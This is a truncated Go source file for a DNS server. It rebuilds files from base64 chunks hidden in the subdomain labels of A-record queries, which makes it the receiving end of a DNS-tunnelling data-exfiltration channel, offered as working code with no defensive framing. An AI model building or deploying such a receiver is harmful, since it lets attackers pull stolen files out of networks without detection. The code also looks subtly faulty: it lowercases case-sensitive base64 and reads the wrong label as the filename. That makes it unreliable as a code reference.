// receiver.go (updated with ordering)
package main

import (
    "encoding/base64"
    "fmt"
    "github.com/miekg/dns"
    "os"
    "sort"
    "strconv"
    "strings"
    "sync"
)

type chunk struct {
    seq  int
    data string
}

var (
    dataStore = make(map[string][]chunk)
    mutex     = &sync.Mutex{}
)

func handleDNSRequest(w dns.ResponseWriter, r *dns.Msg) {
    msg := dns.Msg{}
    msg.SetReply(r)

    for _, q := range r.Question {
        if q.Qtype == dns.TypeA {
            domain := strings.ToLower(q.Name)
            parts := strings.Split(domain, ".")

            if len(parts) < 3 {
                continue
            }

            filename := parts[len(parts)-2]
            labels := parts[:len(parts)-2]

            mutex.Lock()
            for _, label := range labels {
                if len(label) < 4 {
                    continue // skip invalid entries
                }

                seqStr := label[:4]
                data := label[4:]

                seq, err := strconv.Atoi(seqStr)
                if err != nil {
                    continue
                }

                dataStore[filename] = append(dataStore[filename], chunk{seq, data})
            }
            mutex.Unlock()

            fmt.Printf("[+] Received %d chunk(s) for %s\n", len(labels), filename)
        }
    }

    w.WriteMsg(&msg)
}

func saveFiles() {
    mutex.Lock()
    defer mutex.Unlock()

    for filename, chunks := range dataStore {
        // Sort by sequence number
        sort.Slice(chunks, func(i, j int) bool {
            return chunks[i].seq < chunks[j].seq
        })

        var fullData strings.Builder
        for _, c := range chunks {
            fullData.WriteString(c.data)
        }

        b64 := fullData.String()

        // Ensure proper padding
        if pad := len(b64) % 4; pad != 0 {
